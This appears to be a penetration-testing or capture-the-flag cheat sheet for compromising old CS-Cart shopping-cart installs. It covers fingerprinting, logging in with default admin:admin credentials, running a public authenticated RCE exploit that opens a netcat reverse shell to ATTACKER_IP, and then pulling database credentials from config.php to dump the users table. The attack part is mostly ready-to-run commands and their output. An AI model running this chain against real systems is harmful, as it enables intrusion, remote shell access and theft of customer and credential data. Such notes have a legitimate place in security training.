# CS-Cart

CS-Cart is PHP shopping cart software. Older exposed installs may allow admin login with default credentials and authenticated RCE through public exploit tooling.

## Discovery

Useful indicators:

```text
80/tcp open  http  Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-title: CS-Cart. Powerful PHP shopping cart software
```

WhatWeb may show:

```text
Apache[2.2.4], CS-Cart, PHP[5.2.3-1ubuntu6], PasswordField[password], Title[CS-Cart. Powerful PHP shopping cart software]
```

Useful application paths:

```text
http://TARGET/index.php?target=sitemap
http://TARGET/index.php?target=profiles&mode=update
```

## Default Admin Login

Try the default admin credentials:

```text
admin:admin
```

## Authenticated RCE

Public exploit used:

```text
https://github.com/reatva/CS-Cart-1.3.3-RCE
```

Start a listener:

```bash
nc -nlvp 80
```

Run the exploit with the working admin credentials:

```bash
python3 Cs-Cart.py -U http://TARGET -u admin -p admin -L ATTACKER_IP -P 80
```

Successful output:

```text
[+] Login Successful
[+] Payload uploaded successfully.
[+] Open up netcat to receive reverse shell on ATTACKER_IP:80
```

Successful shell context:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/skins
```

## Database Credentials

CS-Cart database credentials may be in `config.php`:

```php
$db_host = 'localhost';
$db_name = 'cscart';
$db_user = 'root';
$db_password = 'root';
```

Connect locally from the target:

```bash
mysql -u root -h localhost -p
```

Useful database enumeration:

```sql
show databases;
use cscart;
show tables;
select * from cscart_users\G
```
